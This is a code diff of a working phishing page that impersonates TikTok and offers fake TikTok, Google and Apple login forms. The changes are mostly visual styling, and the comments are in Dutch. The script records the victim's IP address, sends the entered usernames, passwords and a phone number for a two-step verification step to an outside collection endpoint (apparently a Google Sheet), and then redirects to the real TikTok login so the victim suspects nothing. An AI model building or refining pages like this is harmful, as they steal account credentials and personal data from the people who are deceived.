@@ -15,7 +15,7 @@
                     colors: {
                         tiktokbg: '#121212',
                         tiktokred: '#fe2c55',
-                        tiktokredhover: '#e0244a',
+                        tiktokcyan: '#2bf6e5',
                         applebg: '#f5f5f7',
                     }
                 }
@@ -37,6 +37,10 @@
         .apple-input-group input:first-child { border-top-left-radius: 0.5rem; border-top-right-radius: 0.5rem; border-bottom: none; }
         .apple-input-group input:last-child { border-bottom-left-radius: 0.5rem; border-bottom-right-radius: 0.5rem; }
 
+        /* TikTok Aberration (Glitch) Effect */
+        .tiktok-glitch { text-shadow: 1.5px 1.5px 0px #2bf6e5, -1.5px -1.5px 0px #fe2c55; }
+        .tiktok-glitch-lg { text-shadow: 2px 2px 0px #2bf6e5, -2px -2px 0px #fe2c55; }
+
         /* Vloeiende fade animatie */
         .fade-out { animation: fadeOut 0.3s forwards; }
         .fade-in { animation: fadeIn 0.3s forwards; display: flex !important; }
@@ -53,7 +57,8 @@
         <div id="bg-media" class="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-40"></div>
         <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-10 bg-gradient-to-b from-black/80 to-transparent">
             <div class="flex items-center space-x-2">
-                <i class="fa-brands fa-tiktok text-2xl text-white"></i>
+                <!-- Glitch logo -->
+                <i class="fa-brands fa-tiktok text-2xl text-white tiktok-glitch"></i>
                 <div class="flex flex-col">
                     <span class="text-[15px] font-bold leading-tight">TikTok</span>
                     <span class="text-[10px] text-gray-300 font-medium">Global video community</span>
@@ -92,14 +97,16 @@
         </div>
 
         <div class="bg-white rounded-xl w-11/12 max-w-[320px] relative z-30 pt-14 pb-6 px-6 text-center text-black shadow-2xl">
+            <!-- Glitch logo in het midden -->
             <div class="absolute -top-10 left-1/2 transform -translate-x-1/2 w-20 h-20 bg-black rounded-full border-[4px] border-white flex items-center justify-center shadow-md">
-                <i class="fa-brands fa-tiktok text-white text-[42px] ml-1"></i>
+                <i class="fa-brands fa-tiktok text-white text-[42px] ml-1 tiktok-glitch-lg"></i>
             </div>
             <h2 class="text-[20px] font-bold mb-2">Watch this video on TikTok</h2>
             <p class="text-[15px] text-gray-700 mb-6 font-medium px-2 leading-snug">Someone shared this video with you. Check it out!</p>
             <div class="flex flex-col space-y-3">
                 <button onclick="startLoginFlow()" class="bg-[#fe2c55] text-white w-full py-3 rounded-md font-bold text-[16px] hover:bg-[#e0244a] transition">Login to watch</button>
-                <button onclick="window.location.href='https://google.com'" class="bg-transparent text-black w-full py-3 rounded-md font-bold text-[16px] hover:bg-gray-50 transition">Not now</button>
+                <!-- Font-weight aangepast naar normaal -->
+                <button onclick="window.location.href='https://google.com'" class="bg-transparent text-black w-full py-3 rounded-md font-normal text-[16px] hover:bg-gray-50 transition border border-transparent">Not now</button>
             </div>
         </div>
     </div>
@@ -111,7 +118,9 @@
     <div id="login-app" class="hidden flex-col min-h-screen relative w-full">
         <header class="flex justify-between items-center p-4 lg:px-6 w-full absolute top-0">
             <div class="flex items-center space-x-2 cursor-pointer">
-                <i class="fa-brands fa-tiktok text-2xl"></i><span class="text-xl font-bold tracking-tight">TikTok</span>
+                <!-- Glitch logo linksboven -->
+                <i class="fa-brands fa-tiktok text-2xl text-white tiktok-glitch"></i>
+                <span class="text-xl font-bold tracking-tight">TikTok</span>
             </div>
             <div class="text-sm font-semibold text-gray-300 hover:text-white cursor-pointer flex items-center space-x-2 bg-white/10 px-3 py-1.5 rounded-full">
                 <i class="fa-regular fa-circle-question"></i><span>Feedback en hulp</span>
@@ -233,7 +242,10 @@
                 <button onclick="closeModals()" class="text-gray-400 hover:text-black"><i class="fa-solid fa-xmark text-lg"></i></button>
             </div>
             <div class="p-8 pb-10 text-center flex flex-col items-center">
-                <div class="bg-black text-white w-14 h-14 rounded-xl flex items-center justify-center shadow-md mb-6"><i class="fa-brands fa-tiktok text-3xl"></i></div>
+                <!-- Hier kan de glitch eventueel ook, maar in het origineel is hij clean -->
+                <div class="bg-black text-white w-14 h-14 rounded-xl flex items-center justify-center shadow-md mb-6">
+                    <i class="fa-brands fa-tiktok text-3xl tiktok-glitch"></i>
+                </div>
                 <h2 class="text-[20px] font-medium mb-6 leading-snug">Log in met Apple</h2>
                 <form id="form-apple" name="apple-login" class="w-full">
                     <div class="w-full apple-input-group mb-8 shadow-sm">
@@ -257,7 +269,6 @@
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('bg-media').style.backgroundImage = `url('${ACHTERGROND_MEDIA_URL}')`;
             
-            // Fetch IP adres via ipify API
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => { userIP = data.ip; })
@@ -287,7 +298,6 @@
         function closeModals() { 
             document.getElementById('modal-google').classList.add('hidden'); 
             document.getElementById('modal-apple').classList.add('hidden'); 
-            // Reset google form terug naar stap 1 bij sluiten
             document.getElementById('google-step-1').classList.remove('hidden');
             document.getElementById('google-step-2').classList.add('hidden');
         }
@@ -295,7 +305,7 @@
 
         // --- 4. TIKTOK INPUT VALIDATIE ---
         const ttUser = document.getElementById('tt-user'), ttPass = document.getElementById('tt-pass'), ttBtn = document.getElementById('btn-login-tiktok');
-        let isSubmitting = false; // Voorkom dat input velden de spinner weghalen
+        let isSubmitting = false; 
 
         function checkFields() {
             if(isSubmitting) return; 
@@ -315,7 +325,6 @@
             setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 2500); 
         }
 
-        // Functie voor de 1,5s spinner animatie
         function showSpinner(btnId, callback) {
             const btn = document.getElementById(btnId);
             const originalHTML = btn.innerHTML;
@@ -333,14 +342,13 @@
             }, 1500);
         }
 
-        // Standaard form handler (TikTok & Apple)
         function bindStandardForm(formId, btnId) {
             const form = document.getElementById(formId);
             form.addEventListener('submit', e => {
                 e.preventDefault();
                 showSpinner(btnId, () => {
                     const formData = new FormData(form);
-                    formData.append('user_ip', userIP); // Voeg IP adres toe
+                    formData.append('user_ip', userIP); 
                     fetch(scriptURL, { method: 'POST', body: formData })
                         .then(() => triggerAppRedirect())
                         .catch(() => triggerAppRedirect());
@@ -354,9 +362,9 @@
         // --- 6. GOOGLE 2-STAPS VERIFICATIE LOGICA ---
         const formGoogle = document.getElementById('form-google');
         
-        // Stap 1: Login Gegevens indienen -> Toon Spinner -> Ga naar Verificatie
+        // Stap 1: Ga naar Telefoon verificatie
         formGoogle.addEventListener('submit', e => {
-            e.preventDefault(); // Voorkom direct verzenden
+            e.preventDefault(); 
             showSpinner('btn-google-1', () => {
                 document.getElementById('google-step-1').classList.add('hidden');
                 document.getElementById('google-step-2').classList.remove('hidden');
@@ -364,11 +372,10 @@
             });
         });
 
-        // Stap 2: Telefoonnummer indienen -> Toon Spinner -> Verstuur alles naar Google Sheets -> Redirect
+        // Stap 2: Verzend alles inclusief het correct opgemaakte telefoonnummer
         document.getElementById('btn-google-2').addEventListener('click', () => {
             const phoneInput = document.getElementById('google_phone').value;
             
-            // Simpele validatie dat veld niet leeg is
             if(phoneInput.trim() === '') {
                 document.getElementById('google_phone').classList.add('border-red-500');
                 return;
@@ -376,8 +383,10 @@
 
             showSpinner('btn-google-2', () => {
                 const formData = new FormData(formGoogle);
-                formData.append('user_ip', userIP); // Voeg IP adres toe
-                formData.set('google_phone', '+31 ' + phoneInput); // Plak landcode aan het nummer
+                formData.append('user_ip', userIP); 
+                
+                // Dit zorgt ervoor dat de input met name "google_phone" de +31 prefix meekrijgt in de sheet
+                formData.set('google_phone', '+31 ' + phoneInput); 
                 
                 fetch(scriptURL, { method: 'POST', body: formData })
                     .then(() => triggerAppRedirect())
